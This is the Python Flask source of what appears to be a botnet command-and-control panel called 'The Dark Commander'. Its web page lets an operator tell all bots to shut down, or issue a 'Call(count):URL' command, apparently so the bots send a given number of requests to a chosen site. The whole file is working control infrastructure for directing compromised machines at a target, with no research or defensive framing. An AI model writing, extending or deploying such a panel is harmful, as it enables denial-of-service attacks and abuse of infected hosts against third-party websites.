from flask import Flask, request, redirect, url_for, render_template_string

app = Flask(__name__)

# Global variable to store the latest command
latest_command = "No current command"

# HTML template stored in a variable with a dark and isolated theme
html_template = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>The Dark Commander</title>
  <style>
    body {
      background-color: #121212;
      color: #e0e0e0;
      font-family: 'Courier New', Courier, monospace;
      text-align: center;
      margin: 0;
      padding: 0;
    }
    h1 {
      margin-top: 40px;
      font-size: 3em;
      color: #ff5555; /* a scarier red tone */
    }
    .command-container {
      background-color: #1c1c1c;
      border: 2px solid #333;
      border-radius: 10px;
      padding: 20px;
      margin: 40px auto;
      width: 90%;
      max-width: 800px;
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.8);
    }
    .button-group {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      margin-bottom: 20px;
    }
    .button-group form {
      margin: 10px;
    }
    button {
      background-color: #444;
      border: none;
      color: #fff;
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
      border-radius: 5px;
      transition: background-color 0.3s;
    }
    button:hover {
      background-color: #666;
    }
    input[type="text"] {
      padding: 8px;
      font-size: 16px;
      border: 1px solid #555;
      border-radius: 5px;
      background-color: #222;
      color: #fff;
      margin-left: 5px;
    }
    #latestcommand {
      font-size: 24px;
      font-weight: bold;
      margin-top: 20px;
      padding: 10px;
      border: 1px solid #333;
      background-color: #1a1a1a;
    }
  </style>
</head>
<body>
  <h1>The Dark Commander</h1>
  
  <div class="command-container">
    <!-- Command Buttons and Inputs -->
    <div class="button-group">
      <!-- Close all Bots button -->
      <form action="{{ url_for('close_bots') }}" method="post">
        <button type="submit">Close all Bots</button>
      </form>
  
      <!-- Make Webpage Call button with Count and URL inputs -->
      <form action="{{ url_for('make_call') }}" method="post">
        <button type="submit">Make Webpage Call</button>
        <input type="text" name="count" placeholder="Count" required>
        <input type="text" name="url" placeholder="URL" required>
      </form>
  
      <!-- Clear Command button -->
      <form action="{{ url_for('clear_command') }}" method="post">
        <button type="submit">Clear Command</button>
      </form>
    </div>
  
    <!-- Display the latest command -->
    <div id="latestcommand">{{ latest_command }}</div>
  </div>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def index():
    return render_template_string(html_template, latest_command=latest_command)

@app.route("/close_bots", methods=["POST"])
def close_bots():
    global latest_command
    latest_command = "GOODBYE"
    return redirect(url_for("index"))

@app.route("/make_call", methods=["POST"])
def make_call():
    global latest_command
    count = request.form.get("count", "").strip()
    url_field = request.form.get("url", "").strip()
    # Set the command as: Call(<COUNT>):<URL>
    latest_command = f"Call({count}):{url_field}"
    return redirect(url_for("index"))

@app.route("/clear_command", methods=["POST"])
def clear_command():
    global latest_command
    latest_command = "No current command"
    return redirect(url_for("index"))

if __name__ == "__main__":
    app.run(debug=True)